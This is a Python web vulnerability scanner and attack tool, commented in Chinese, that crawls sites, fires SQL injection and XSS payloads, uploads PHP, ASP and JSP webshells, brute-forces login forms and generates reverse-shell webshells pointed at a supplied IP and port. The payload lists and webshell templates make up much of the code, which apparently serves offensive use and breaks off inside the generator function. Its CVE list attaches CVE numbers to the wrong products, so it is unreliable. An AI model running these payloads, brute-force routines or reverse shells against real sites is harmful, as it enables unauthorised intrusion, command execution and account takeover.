#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Web漏洞扫描器
一个全面的Web漏洞扫描工具，可以检测SQL注入、XSS、文件上传等常见漏洞，支持自动渗透和登录爆破。
"""

# 导入colorama库用于跨平台颜色显示
has_colorama = False
try:
    from colorama import init, Fore, Style
    has_colorama = True
except ImportError:
    logging.warning('未找到colorama库，将不显示彩色输出。可以使用pip install colorama安装')

import requests
import argparse
import re
import time
import json
import logging
import concurrent.futures
import threading
import itertools
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import datetime
from bs4 import BeautifulSoup

# 导入用于生成常见密码的库
try:
    import itertools
except ImportError:
    pass

# 常见用户名和密码字典
default_usernames = ['admin', 'administrator', 'user', 'root', 'test', 'guest']
default_passwords = ['admin', 'password', '123456', 'qwerty', 'welcome', '12345678', 'letmein', 'monkey', '111111', '12345']

# Configure logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('web_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class WebScanner:
    """
    Web漏洞扫描器类，对目标网站执行各种安全检查，包括自动渗透和登录爆破。
    """

    def __init__(self, target_url, threads=5, timeout=10, user_agent=None, output_file=None,
                 brute_force=False, username_dict=None, password_dict=None, max_login_attempts=100):
        """
        初始化WebScanner，设置目标URL和扫描参数。

        参数:
            target_url (str): 目标网站URL
            threads (int): 并发扫描使用的线程数
            timeout (int): HTTP请求超时时间(秒)
            user_agent (str): 自定义用户代理字符串
            output_file (str): 扫描报告输出文件
            brute_force (bool): 是否启用暴力破解登录
            username_dict (list): 用户名字典
            password_dict (list): 密码字典
            max_login_attempts (int): 最大登录尝试次数
        """
        self.target_url = target_url.rstrip('/') if target_url else ''
        self.threads = threads
        self.timeout = timeout
        self.user_agent = user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        self.session = requests.Session()
        self.session.headers['User-Agent'] = self.user_agent
        self.vulnerabilities = {}
        self.scanned_urls = set()
        self.lock = threading.Lock()
        self.max_retries = 3
        self.output_file = output_file or f"scan_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.crawled_urls = set()
        self.forms = []
        self.login_forms = []
        self.site_framework = None
        self.admin_pages = []
        self.max_depth = 3
        self.brute_force = brute_force
        self.username_dict = username_dict or default_usernames
        self.password_dict = password_dict or default_passwords
        self.max_login_attempts = max_login_attempts
        self.cracked_credentials = []

        # Frameworks signatures
        self.framework_signatures = {
            'WordPress': ['/wp-content/', '/wp-includes/', 'wp-', 'wordpress'],
            'Joomla': ['/joomla/', '/components/', '/modules/', 'Joomla'],
            'Drupal': ['/drupal/', 'Drupal', '/sites/default/'],
            'Magento': ['/magento/', 'Magento', '/skin/frontend/'],
            'PrestaShop': ['/prestashop/', 'PrestaShop', '/themes/'],
            'OpenCart': ['/opencart/', 'OpenCart', '/catalog/'],
            'Laravel': ['/laravel/', 'Laravel', '/storage/'],
            'Symfony': ['/symfony/', 'Symfony', '/vendor/symfony/'],
            'Django': ['/django/', 'Django', '/static/admin/']
        }

        # Common admin pages to check
        self.admin_pages_list = [
            '/admin', '/admin/login', '/admin.php', '/wp-admin',
            '/administrator', '/admin_area', '/admin_login',
            '/backend', '/controlpanel', '/cp', '/manager',
            '/admin123', '/adminarea', '/admin_login.php',
            '/admincp', '/adminpanel', '/login', '/login.php',
            '/signin', '/user/login', '/admin/console',
            '/admin/dashboard', '/admin/site', '/admin/settings',
            '/admin/users', '/admin/content', '/admin/products',
            '/admin/orders', '/admin/reports'
        ]

        # SQL injection test vectors (扩展版)
        self.sql_injection_vectors = [
            # 基本测试
            "'",
            "' OR '1'='1'",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1 LIMIT 1 --",
            "1 OR 1=1",
            "1' OR '1'='1",
            "/**/OR/**/1=1",
            "/**/AND/**/1=1",
            "/**/AND/**/1=2",
            "/**/SLEEP(5)",  # 时间延迟测试
            "/**/WAITFOR DELAY '0:0:5'",  # SQL Server 时间延迟

            # 联合查询
            "' UNION SELECT NULL, NULL, CONCAT(version(), ':', database(), ':', user()) --",
            "' UNION SELECT 1,2,3 --",
            "' UNION ALL SELECT NULL, user(), version() --",
            "' UNION ALL SELECT NULL, NULL, NULL, table_name FROM information_schema.tables --",
            "' UNION ALL SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name='users' --",

            # 报错注入
            "' AND extractvalue(1, concat(0x7e, version())) --",
            "' AND updatexml(1, concat(0x7e, database()), 1) --",
            "' OR 1=(SELECT 1 FROM dual WHERE 1=1) --",
            "1' AND 1=convert(int, (SELECT version())) --",

            # 布尔盲注
            "' AND 1=1",
            "' AND 1=2",
            "' AND length(database())>5",
            "' AND substring(database(),1,1)='a'",

            # 命令执行
            "1'; EXEC sp_who2 --",
            "1'; EXEC xp_cmdshell 'dir' --",
            "1; DROP TABLE IF EXISTS users --",
            "1' OR '1'='1' OPTION (MAXDOP 1) --",  # SQL Server 特定
        ]

        # XSS test vectors (扩展版)
        self.xss_vectors = [
            # 基本XSS
            "<script>alert('XSS')</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<body/onload=alert('XSS')>",

            # 属性XSS
            "' onmouseover='alert(1)" ,
            "' onclick='alert(1)" ,
            "' onfocus='alert(1)" ,
            "' onblur='alert(1)" ,
            "' onload='alert(1)" ,

            # 绕过技术
            "<scRipt>alert('XSS')</scRipt>",  # 大小写混淆
            "<script>alert(String.fromCharCode(88,83,83))</script>",  # 字符编码
            "<script>\x61\x6C\x65\x72\x74('XSS')</script>",  # 十六进制编码
            "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",  # Base64编码
            "<script>alert(\'XSS\')</script>",  # 单引号转义
            "<script>alert(\"XSS\")</script>",  # 双引号转义
        ]

        # File upload test vectors (扩展版)
        self.file_upload_vectors = [
            # PHP WebShells
            ('test.php', '<?php phpinfo(); ?>', 'application/x-php'),
            ('test.php', '<?php system($_GET[\'cmd\']); ?>', 'application/x-php'),
            ('test.php', '<?php eval($_POST[\'cmd\']); ?>', 'application/x-php'),
            ('test.php', '<?php $a=$_GET[\'a\'];exec($a); ?>', 'application/x-php'),
            ('test.jpg', 'GIF89a<?php phpinfo(); ?>', 'image/jpeg'),
            ('test.png', '<?php phpinfo(); ?>', 'image/png'),
            ('test.php5', '<?php phpinfo(); ?>', 'application/x-php'),
            ('test.phtml', '<?php phpinfo(); ?>', 'application/x-php'),
            ('test.inc', '<?php phpinfo(); ?>', 'text/plain'),

            # ASP WebShells
            ('test.asp', '<% response.write("XSS") %>', 'text/plain'),
            ('test.asp', '<% execute(request("cmd")) %>', 'text/plain'),
            ('test.aspx', '<%@ Page Language="C#" %><% Response.Write("XSS"); %>', 'text/plain'),
            ('test.aspx', '<%@ Page Language="VB" %><% Response.Write("XSS") %>', 'text/plain'),

            # JSP WebShells
            ('test.jsp', '<% out.println("XSS"); %>', 'text/plain'),
            ('test.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'text/plain'),

            # 其他类型
            ('test.shtml', '#include virtual=\"/cgi-bin/printenv\"', 'text/html'),
            ('test.html', '<script>alert(\"XSS\")</script>', 'text/html'),
            ('test.txt', '<?php phpinfo(); ?>', 'text/plain'),
            ('test.pdf', '<?php phpinfo(); ?>', 'application/pdf'),
            ('test.zip', '<?php phpinfo(); ?>', 'application/zip'),  # 尝试绕过文件类型检测
            ('test.exe', '<?php phpinfo(); ?>', 'application/octet-stream'),  # 尝试绕过文件类型检测

            # 多扩展名绕过
            ('test.jpg.php', '<?php phpinfo(); ?>', 'image/jpeg'),
            ('test.php.jpg', '<?php phpinfo(); ?>', 'image/jpeg'),
            ('test.php%00.jpg', '<?php phpinfo(); ?>', 'image/jpeg'),  # NULL字节绕过
            ('test.php#.jpg', '<?php phpinfo(); ?>', 'image/jpeg')  # 片段标识符绕过
        ]

        # WebShell templates for generation
        self.webshell_templates = {
            'php': {
                'simple': '<?php system($_GET[\'cmd\']); ?>',
                'post': '<?php eval($_POST[\'cmd\']); ?>',
                'base64': '<?php eval(base64_decode($_GET[\'code\'])); ?>',
                'obfuscated': '<?php $a=strrev(\'edoc\');$b=strrev(\'noisrevda\');$c=$_GET[\'cmd\'];@$b($a($c)); ?>',
                'reverse_shell': '<?php $sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3"); ?>'
            },
            'asp': {
                'simple': '<% execute(request("cmd")) %>',
                'reverse_shell': '<% Set objShell = CreateObject("WScript.Shell"):objShell.Exec "cmd.exe /c powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" %>'
            },
            'jsp': {
                'simple': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
                'reverse_shell': '<%@ page import="java.net.*,java.io.*"%><% String cmd="/bin/sh";if(System.getProperty("os.name").toLowerCase().contains("windows")){cmd="cmd.exe";}Socket s=new Socket("{ip}",{port});InputStream in=s.getInputStream();OutputStream out=s.getOutputStream();Process p=Runtime.getRuntime().exec(cmd);new Thread(new StreamHandler(p.getInputStream(),out)).start();new Thread(new StreamHandler(in,p.getOutputStream())).start();%><%!class StreamHandler implements Runnable{InputStream in;OutputStream out;public StreamHandler(InputStream in,OutputStream out){this.in=in;this.out=out;}public void run(){try{byte[] buf=new byte[1024];int len;while((len=in.read(buf))!=-1){out.write(buf,0,len);out.flush();}}catch(Exception e){}}}%>'
            }
        }

        # CVE database (simplified)
        self.cve_database = {
            'WordPress': [
                {'cve': 'CVE-2023-23397', 'description': 'Critical severity vulnerability in WordPress Core affecting versions 6.1.1 and earlier'},
                {'cve': 'CVE-2023-24329', 'description': 'Privilege escalation vulnerability in WordPress Core'},
            ],
            'Joomla': [
                {'cve': 'CVE-2023-23752', 'description': 'Critical SQL injection vulnerability in Joomla!'},
                {'cve': 'CVE-2023-23751', 'description': 'Information disclosure vulnerability in Joomla!'},
            ],
            'Drupal': [
                {'cve': 'CVE-2023-2861', 'description': 'Critical remote code execution vulnerability in Drupal'},
                {'cve': 'CVE-2023-2748', 'description': 'Moderate information disclosure vulnerability in Drupal'},
            ],
            'Magento': [
                {'cve': 'CVE-2023-2727', 'description': 'Critical remote code execution vulnerability in Magento'},
                {'cve': 'CVE-2023-2728', 'description': 'High severity SQL injection vulnerability in Magento'},
            ],
            'PrestaShop': [
                {'cve': 'CVE-2023-2625', 'description': 'High severity cross-site scripting vulnerability in PrestaShop'},
                {'cve': 'CVE-2023-2626', 'description': 'High severity SQL injection vulnerability in PrestaShop'},
            ],
            'OpenCart': [
                {'cve': 'CVE-2023-2070', 'description': 'High severity cross-site scripting vulnerability in OpenCart'},
                {'cve': 'CVE-2023-2071', 'description': 'High severity SQL injection vulnerability in OpenCart'},
            ],
            'Laravel': [
                {'cve': 'CVE-2023-2034', 'description': 'Critical remote code execution vulnerability in Laravel'},
                {'cve': 'CVE-2023-2035', 'description': 'High severity cross-site scripting vulnerability in Laravel'},
            ],
            'Symfony': [
                {'cve': 'CVE-2023-2032', 'description': 'High severity cross-site scripting vulnerability in Symfony'},
                {'cve': 'CVE-2023-2033', 'description': 'Moderate information disclosure vulnerability in Symfony'},
            ],
            'Django': [
                {'cve': 'CVE-2023-1937', 'description': 'High severity SQL injection vulnerability in Django'},
                {'cve': 'CVE-2023-1938', 'description': 'Moderate cross-site scripting vulnerability in Django'},
            ]
        }

    def run_full_scan(self):
        """
        运行完整扫描，包括框架识别、已知漏洞检查、后台页面发现、网站爬取和所有漏洞扫描，
        以及可选的登录爆破和自动渗透测试。
        """
        logger.info(f'开始对 {self.target_url} 进行完整扫描')
        start_time = time.time()

        try:
            # 检查目标是否可达
            if not self._check_reachable():
                logger.error(f'目标 {self.target_url} 不可达')
                return {'error': f'目标 {self.target_url} 不可达'}

            # 识别Web框架
            framework = self._identify_framework()
            if framework:
                logger.info(f'识别到框架: {framework}')
                self.vulnerabilities['framework'] = framework

                # 检查已知漏洞
                known_vulnerabilities = self._check_known_vulnerabilities(framework)
                if known_vulnerabilities:
                    self.vulnerabilities['known_vulnerabilities'] = known_vulnerabilities

            # 发现管理页面
            admin_pages = self._find_admin_pages()
            if admin_pages:
                logger.info(f'发现 {len(admin_pages)} 个潜在管理页面')
                self.vulnerabilities['admin_pages'] = admin_pages

            # 爬取网站
            logger.info('开始爬取网站')
            # 执行爬取
            crawled_urls = self._crawl_website(self.target_url)
            logger.info(f'已爬取 {len(self.crawled_urls)} 个URL')
            logger.info(f'发现 {len(self.forms)} 个表单，其中 {len(self.login_forms)} 个可能是登录表单')

            # 扫描SQL注入漏洞
            logger.info('开始扫描SQL注入漏洞')
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                sql_injection_futures = {executor.submit(self._test_sql_injection, url): url for url in crawled_urls}
                sql_injection_vulns = []
                for future in concurrent.futures.as_completed(sql_injection_futures):
                    vulns = future.result()
                    if vulns:
                        sql_injection_vulns.extend(vulns)

            if sql_injection_vulns:
                logger.info(f'发现 {len(sql_injection_vulns)} 个SQL注入漏洞')
                self.vulnerabilities['sql_injection'] = sql_injection_vulns

            # 扫描XSS漏洞
            logger.info('开始扫描XSS漏洞')
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                xss_futures = {executor.submit(self._test_xss, url): url for url in crawled_urls}
                xss_vulns = []
                for future in concurrent.futures.as_completed(xss_futures):
                    vulns = future.result()
                    if vulns:
                        xss_vulns.extend(vulns)

            if xss_vulns:
                logger.info(f'发现 {len(xss_vulns)} 个XSS漏洞')
                self.vulnerabilities['xss'] = xss_vulns

            # 扫描文件上传漏洞
            logger.info('开始扫描文件上传漏洞')
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                file_upload_futures = {executor.submit(self._test_file_upload, url): url for url in crawled_urls}
                file_upload_vulns = []
                for future in concurrent.futures.as_completed(file_upload_futures):
                    vulns = future.result()
                    if vulns:
                        file_upload_vulns.extend(vulns)

            if file_upload_vulns:
                logger.info(f'发现 {len(file_upload_vulns)} 个文件上传漏洞')
                self.vulnerabilities['file_upload'] = file_upload_vulns

            # 执行暴力破解（如果启用）
            post_login_vulnerabilities = []
            if self.brute_force and self.login_forms:
                logger.info(f'开始对 {len(self.login_forms)} 个登录表单执行暴力破解')
                for form in self.login_forms:
                    successful_credentials = self._brute_force_login(form)
                    if successful_credentials:
                        # 登录成功后执行渗透测试
                        for cred in successful_credentials:
                            vulns = self._perform_post_login_attack(cred)
                            post_login_vulnerabilities.extend(vulns)

            if post_login_vulnerabilities:
                logger.info(f'登录后渗透测试发现 {len(post_login_vulnerabilities)} 个漏洞')
                self.vulnerabilities['post_login'] = post_login_vulnerabilities

            # 生成报告
            report = self._generate_report()
            end_time = time.time()
            logger.info(f'扫描完成，耗时 {end_time - start_time:.2f} 秒')
            return report

        except KeyboardInterrupt:
            logger.info('扫描被用户中断')
            # 生成报告，确保已扫描内容被保存
            report = self._generate_report()
            return {'status': 'interrupted', 'vulnerabilities': self.vulnerabilities, 'report': report}
        except Exception as e:
            logger.error(f'扫描过程中发生错误: {str(e)}')
            return {'error': str(e)}

    def _check_reachable(self):
        """
        检查目标URL是否可达。

        返回:
            bool: 可达返回True，不可达返回False
        """
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            return response.status_code < 400
        except Exception:
            return False

    def _identify_framework(self):
        """
        识别目标网站使用的Web框架。

        返回:
            str: 识别到的框架名称，未识别则返回None
        """
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            headers = response.headers
            content = response.text.lower()

            # Check cookies for framework signatures
            for cookie in response.cookies:
                cookie_name = cookie.name.lower()
                for framework, signatures in self.framework_signatures.items():
                    for signature in signatures:
                        if signature in cookie_name:
                            return framework

            # Check headers for framework signatures
            for header, value in headers.items():
                header_value = value.lower()
                for framework, signatures in self.framework_signatures.items():
                    for signature in signatures:
                        if signature in header_value:
                            return framework

            # Check content for framework signatures
            for framework, signatures in self.framework_signatures.items():
                for signature in signatures:
                    if signature in content:
                        return framework

            return None
        except Exception as e:
            logger.error(f'Error identifying framework: {str(e)}')
            return None

    def _check_known_vulnerabilities(self, framework):
        """
        根据识别的框架检查已知漏洞。

        参数:
            framework (str): 识别到的框架名称

        返回:
            list: 框架的已知漏洞列表
        """
        if framework in self.cve_database:
            return self.cve_database[framework]
        return []

    def _find_admin_pages(self):
        """
        尝试在目标网站上找到管理页面。

        返回:
            list: 发现的管理页面列表
        """
        found_admin_pages = []

        for page in self.admin_pages_list:
            admin_url = urljoin(self.target_url, page)
            try:
                response = self.session.get(admin_url, timeout=self.timeout, allow_redirects=False)
                # Check if the page exists (status code 200) or redirects to a login page
                if response.status_code == 200 or (response.status_code in [301, 302] and 'login' in response.headers.get('Location', '').lower()):
                    found_admin_pages.append(admin_url)
            except Exception as e:
                logger.debug(f'Error checking admin page {admin_url}: {str(e)}')

        return found_admin_pages

    def _crawl_website(self, start_url, depth=0):
        """
        从给定URL开始爬取网站。

        参数:
            start_url (str): 爬取的起始URL
            depth (int): 当前爬取深度

        返回:
            list: 爬取到的URL列表
        """
        if depth > self.max_depth or start_url in self.crawled_urls:
            return []

        self.crawled_urls.add(start_url)
        crawled_urls = [start_url]

        try:
            response = self.session.get(start_url, timeout=self.timeout)
            if response.status_code != 200 or 'text/html' not in response.headers.get('Content-Type', ''):
                return crawled_urls

            soup = BeautifulSoup(response.text, 'html.parser')

            # Extract links from HTML
            links = soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                absolute_link = urljoin(start_url, href)
                parsed_absolute = urlparse(absolute_link)

                # Only crawl links within the same domain
                if parsed_absolute.netloc == urlparse(self.target_url).netloc:
                    if absolute_link not in self.crawled_urls:
                        crawled_urls.extend(self._crawl_website(absolute_link, depth + 1))

            # Extract forms and identify login forms
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action')
                if action:
                    form_url = urljoin(start_url, action)
                    form_data = {
                        'url': form_url,
                        'method': form.get('method', 'get').lower(),
                        'inputs': []
                    }

                    # Extract input fields
                    inputs = form.find_all('input')
                    for input_field in inputs:
                        input_name = input_field.get('name')
                        input_type = input_field.get('type', 'text')
                        if input_name:
                            form_data['inputs'].append({
                                'name': input_name,
                                'type': input_type
                            })

                    self.forms.append(form_data)

                    # Check if this might be a login form
                    if self._is_login_form(form_data):
                        self.login_forms.append(form_data)
                        logger.info(f'发现潜在的登录表单: {form_url}')
        except Exception as e:
            logger.debug(f'Error crawling {start_url}: {str(e)}')

        return crawled_urls

    def _test_sql_injection(self, url):
        """
        Test a single URL for SQL injection vulnerabilities.

        Args:
            url (str): The URL to test

        Returns:
            list: List of vulnerabilities found in this URL
        """
        vulnerabilities = []
        parsed_url = urlparse(url)

        # Skip URLs without query parameters
        if not parsed_url.query:
            return vulnerabilities

        # Split query parameters
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for vector in self.sql_injection_vectors:
                # Create modified URL with test vector
                modified_params = query_params.copy()
                modified_params[param] = [vector]
                modified_query = urlencode(modified_params, doseq=True)
                modified_url = urljoin(url, f'{parsed_url.path}?{modified_query}')

                # Test the modified URL
                try:
                    response = self.session.get(modified_url, timeout=self.timeout)

                    # Check for SQL injection indicators in response
                    if self._is_sql_injection(response):
                        vulnerabilities.append({
                            'url': modified_url,
                            'param': param,
                            'vector': vector,
                            'status_code': response.status_code
                        })
                        logger.info(f'SQL injection vulnerability found at {modified_url} in parameter {param}')
                        break  # No need to test other vectors for this parameter
                except Exception as e:
                    logger.debug(f'Error testing SQL injection on {modified_url}: {str(e)}')

        return vulnerabilities

    def _is_sql_injection(self, response):
        """
        Check if a response indicates a SQL injection vulnerability.

        Args:
            response (requests.Response): The HTTP response

        Returns:
            bool: True if SQL injection is detected, False otherwise
        """
        # Common SQL error messages
        sql_errors = [
            'you have an error in your sql syntax',
            'warning: mysql',
            'unclosed quotation mark after the character string',
            'quoted string not properly terminated',
            'sql syntax error',
            'odbc microsoft access driver',
            'mysql_fetch_array',
            'pg_query',
            'sqlstate',
            'syntax error near',
            'server error in',
            'mssql',
            'postgresql',
            'sqlite',
            'oracle database error'
        ]

        # Check for SQL errors in response content
        content = response.text.lower()
        for error in sql_errors:
            if error in content:
                return True

        # Check for database version disclosure
        db_version_patterns = [
            r'version\s*\(\s*\)',
            r'database\s*\(\s*\)',
            r'user\s*\(\s*\)',
            r'server_version',
            r'@@version'
        ]

        for pattern in db_version_patterns:
            if re.search(pattern, content):
                return True

        # Check for boolean-based SQL injection (response time and content length differences)
        # This is a simplified check and might need more sophisticated timing analysis
        if response.elapsed.total_seconds() > self.timeout * 1.5:
            return True

        return False

    def _test_xss(self, url):
        """
        Test a single URL for XSS vulnerabilities.

        Args:
            url (str): The URL to test

        Returns:
            list: List of vulnerabilities found in this URL
        """
        vulnerabilities = []
        parsed_url = urlparse(url)

        # Skip URLs without query parameters
        if not parsed_url.query:
            return vulnerabilities

        # Split query parameters
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for vector in self.xss_vectors:
                # Create modified URL with test vector
                modified_params = query_params.copy()
                modified_params[param] = [requests.utils.quote(vector)]
                modified_query = urlencode(modified_params, doseq=True)
                modified_url = urljoin(url, f'{parsed_url.path}?{modified_query}')

                # Test the modified URL
                try:
                    response = self.session.get(modified_url, timeout=self.timeout)

                    # Check if the vector is reflected in the response
                    if vector in response.text:
                        vulnerabilities.append({
                            'url': modified_url,
                            'param': param,
                            'vector': vector,
                            'status_code': response.status_code
                        })
                        logger.info(f'在 {modified_url} 的 {param} 参数中发现XSS漏洞')
                        break  # No need to test other vectors for this parameter
                except Exception as e:
                    logger.debug(f'测试 {modified_url} 的XSS漏洞时出错: {str(e)}')

        return vulnerabilities

    def _test_file_upload(self, url):
        """
        Test a single URL for file upload vulnerabilities.

        Args:
            url (str): The URL to test

        Returns:
            list: List of vulnerabilities found in this URL
        """
        vulnerabilities = []

        # Only test URLs that might handle file uploads
        if 'upload' not in url.lower() and 'file' not in url.lower():
            return vulnerabilities

        for filename, content, content_type in self.file_upload_vectors:
            try:
                # Create a multipart/form-data request
                files = {'file': (filename, content, content_type)}
                response = self.session.post(url, files=files, timeout=self.timeout)

                # Check if the file might have been uploaded successfully
                if response.status_code < 400 and ('success' in response.text.lower() or 'uploaded' in response.text.lower()):
                    # Try to access the uploaded file
                    upload_dirs = ['/uploads/', '/files/', '/userfiles/', '/docs/', '/images/']
                    found = False

                    for upload_dir in upload_dirs:
                        uploaded_file_url = urljoin(self.target_url, f'{upload_dir}{filename}')
                        try:
                            file_response = self.session.get(uploaded_file_url, timeout=self.timeout)
                            if file_response.status_code == 200:
                                vulnerabilities.append({
                                    'url': url,
                                    'file_url': uploaded_file_url,
                                    'filename': filename,
                                    'content_type': content_type,
                                    'status_code': response.status_code
                                })
                                logger.info(f'在 {url} 发现文件上传漏洞。上传的文件可通过 {uploaded_file_url} 访问')
                                found = True
                                break
                        except Exception:
                            continue

                    if not found:
                        vulnerabilities.append({
                            'url': url,
                            'filename': filename,
                            'content_type': content_type,
                            'status_code': response.status_code,
                            'note': 'File might have been uploaded but could not be accessed'
                        })
                        logger.info(f'在 {url} 发现潜在的文件上传漏洞')
            except Exception as e:
                logger.debug(f'测试 {url} 的文件上传漏洞时出错: {str(e)}')

        return vulnerabilities

    def _is_login_form(self, form_data):
        """
        检查表单是否可能是登录表单。

        参数:
            form_data (dict): 表单数据

        返回:
            bool: 如果可能是登录表单则返回True
        """
        # 查找用户名和密码字段
        has_username = False
        has_password = False

        for input_field in form_data['inputs']:
            input_name = input_field['name'].lower()
            input_type = input_field['type'].lower()

            if ('user' in input_name or 'login' in input_name or 'email' in input_name) and input_type != 'password':
                has_username = True
            elif 'pass' in input_name or input_type == 'password':
                has_password = True

        # 如果表单包含用户名和密码字段，认为是登录表单
        return has_username and has_password

    def _get_login_credentials(self, form_data):
        """
        从表单数据中提取用户名和密码字段名称。

        参数:
            form_data (dict): 表单数据

        返回:
            tuple: (username_field, password_field) 如果找到则返回字段名，否则返回(None, None)
        """
        username_field = None
        password_field = None

        for input_field in form_data['inputs']:
            input_name = input_field['name'].lower()
            input_type = input_field['type'].lower()

            if username_field is None and ('user' in input_name or 'login' in input_name or 'email' in input_name) and input_type != 'password':
                username_field = input_field['name']
            elif password_field is None and ('pass' in input_name or input_type == 'password'):
                password_field = input_field['name']

        return username_field, password_field

    def _brute_force_login(self, form_data):
        """
        对登录表单执行暴力破解。

        参数:
            form_data (dict): 登录表单数据

        返回:
            list: 成功的凭证列表
        """
        username_field, password_field = self._get_login_credentials(form_data)
        if not username_field or not password_field:
            logger.warning(f'无法识别登录表单中的用户名和密码字段: {form_data["url"]}')
            return []

        logger.info(f'开始对 {form_data["url"]} 执行暴力破解...')

        # 限制尝试次数
        attempts = 0
        credentials_list = list(itertools.product(self.username_dict, self.password_dict))
        successful_credentials = []

        for username, password in credentials_list:
            if attempts >= self.max_login_attempts:
                logger.info(f'已达到最大尝试次数 {self.max_login_attempts}，停止暴力破解')
                break

            attempts += 1
            logger.debug(f'尝试登录: {username}/{password}')

            # 准备表单数据
            form_params = {}
            for input_field in form_data['inputs']:
                if input_field['name'] == username_field:
                    form_params[input_field['name']] = username
                elif input_field['name'] == password_field:
                    form_params[input_field['name']] = password
                else:
                    # 对于其他字段，使用默认值或空值
                    form_params[input_field['name']] = input_field.get('value', '')

            try:
                # 发送登录请求
                if form_data['method'] == 'post':
                    response = self.session.post(form_data['url'], data=form_params, timeout=self.timeout, allow_redirects=True)
                else:
                    response = self.session.get(form_data['url'], params=form_params, timeout=self.timeout, allow_redirects=True)

                # 检查登录是否成功
                if self._is_login_successful(response, form_data['url']):
                    logger.info(f'登录成功: {username}/{password}')
                    successful_credentials.append({
                        'url': form_data['url'],
                        'username': username,
                        'password': password
                    })
                    self.cracked_credentials.extend(successful_credentials)
            except Exception as e:
                logger.debug(f'尝试登录时出错: {str(e)}')

        return successful_credentials

    def _is_login_successful(self, response, login_url):
        """
        检查登录是否成功。

        参数:
            response (requests.Response): 登录请求的响应
            login_url (str): 登录URL

        返回:
            bool: 如果登录成功则返回True
        """
        # 检查是否重定向到其他页面
        if response.url != login_url and 'login' not in response.url.lower():
            return True

        # 检查响应中是否包含表示成功的关键词
        success_keywords = ['dashboard', 'welcome', 'logout', 'profile', 'account']
        for keyword in success_keywords:
            if keyword in response.text.lower():
                return True

        # 检查是否包含失败关键词
        failure_keywords = ['invalid', 'incorrect', 'error', 'failed', 'denied']
        for keyword in failure_keywords:
            if keyword in response.text.lower():
                return False

        # 默认假设登录失败
        return False

    def _perform_post_login_attack(self, credentials):
        """
        在登录成功后执行简单的渗透测试。

        参数:
            credentials (dict): 成功的登录凭证

        返回:
            list: 发现的漏洞列表
        """
        logger.info(f'使用凭证 {credentials["username"]}/{credentials["password"]} 登录后执行渗透测试...')
        vulnerabilities = []

        # 1. 检查是否有权访问管理页面
        admin_urls = self.vulnerabilities.get('admin_pages', [])
        for admin_url in admin_urls:
            try:
                response = self.session.get(admin_url, timeout=self.timeout)
                if response.status_code == 200 and 'admin' in response.text.lower():
                    vulnerabilities.append({
                        'type': '未授权访问',
                        'url': admin_url,
                        'description': f'使用破解的凭证 {credentials["username"]}/{credentials["password"]} 可以访问管理页面',
                        'credentials': credentials
                    })
                    logger.info(f'发现未授权访问漏洞: {admin_url}')
            except Exception as e:
                logger.debug(f'检查管理页面时出错: {str(e)}')

        # 2. 可以添加更多的渗透测试步骤，例如尝试上传文件、修改用户权限等

        return vulnerabilities

    def get_webshell_type_by_extension(self, file_extension):
        """
        根据文件扩展名获取对应的WebShell类型

        参数:
            file_extension (str): 文件扩展名

        返回:
            str: WebShell类型 (php, asp, jsp) 或 None
        """
        # 转换为小写以忽略大小写差异
        file_extension = file_extension.lower()

        # 常见Web服务器文件扩展名到WebShell类型的映射
        extension_map = {
            # PHP相关扩展名
            'php': 'php',
            'php5': 'php',
            'php7': 'php',
            'phtml': 'php',
            'inc': 'php',
            
            # ASP相关扩展名
            'asp': 'asp',
            'aspx': 'asp',
            'ascx': 'asp',
            'asmx': 'asp',
            
            # JSP相关扩展名
            'jsp': 'jsp',
            'jspx': 'jsp',
            'jws': 'jsp',
            'do': 'jsp'
        }

        return extension_map.get(file_extension)

    def generate_webshell(self, shell_type, template_name='simple', ip=None, port=None):
        """
        生成webshell代码

        参数:
            shell_type (str): WebShell类型 (php, asp, jsp)
            template_name (str): 模板名称
            ip (str): 反向shell的IP地址
            port (int): 反向shell的端口

        返回:
            str: 生成的webshell代码
        """
        if shell_type.lower() not in self.webshell_templates:
            logger.error(f'不支持的WebShell类型: {shell_type}')
            return None

        templates = self.webshell_templates[shell_type.lower()]
        if template_name not in templates:
            logger.error(f'不支持的WebShell模板: {template_name}')
            return None

        webshell_code = templates[template_name]

        # 替换反向shell中的IP和端口
        if 'reverse_shell' in template_name and ip and port:
            webshell_code = webshell_code.replace('{ip}', ip).replace('{port}', str(port))
        elif 'reverse_shell' in template_name:
            logger.warning('生成反向shell需要提供IP和端口')
            return None

